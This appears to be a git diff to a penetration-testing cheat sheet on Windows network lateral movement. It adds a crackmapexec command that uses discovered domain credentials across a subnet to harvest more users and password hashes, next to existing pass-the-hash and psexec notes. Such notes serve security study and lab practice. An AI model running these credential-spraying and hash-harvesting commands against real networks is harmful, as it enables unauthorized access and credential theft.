@@ -12,6 +12,13 @@ Once you get the hash from secrets dump you only want the second part of the has
 crackmapexec smb 192.168.16.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b --local-auth
 ```
 
+### Run this command once domain admin creds are discovered
+
+```bash
+crackmapexec smb 10.10.10.10/24 -u water -p password123
+#new users and their hashes will be discovered
+```
+
 ### psexec
 You can use this command to get a quick easy shell sometimes it works sometimes it doesn't
 
